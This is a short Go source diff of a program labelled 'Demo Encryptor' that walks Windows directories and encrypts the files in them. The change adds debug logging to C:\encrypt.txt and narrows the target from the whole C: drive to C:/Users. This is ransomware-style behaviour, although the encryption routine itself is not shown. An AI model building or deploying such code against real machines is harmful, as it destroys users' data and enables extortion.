@@ -74,9 +74,11 @@ func isTarget(name string) bool {
 }
 
 func encryptDirRecursive(dir string) error {
+	fmt.Fprintf(f, "encryptDirRecursive(%s)\n", dir)
 	count := 0
 	fmt.Printf("Start encryption in %s\n", dir)
 	err := filepath.Walk(dir, func(path string, info fs.FileInfo, err error) error {
+		fmt.Fprintf(f, "func(%s, %v, %v)\n", path, info, err)
 		if err != nil {
 			return err
 		}
@@ -125,8 +127,8 @@ func encryptDir(folder string) error {
 */
 func main() {
 	fmt.Printf("Demo Encryptor (%s)\n", Unique)
-	//folder := "C:/Users"
-	folder := "C:"
+	folder := "C:/Users"
+	//folder := "C:/"
 	//	err := encryptDirRecursive(dir)
 	var err error
 	f, err = os.Create("C:\\encrypt.txt")
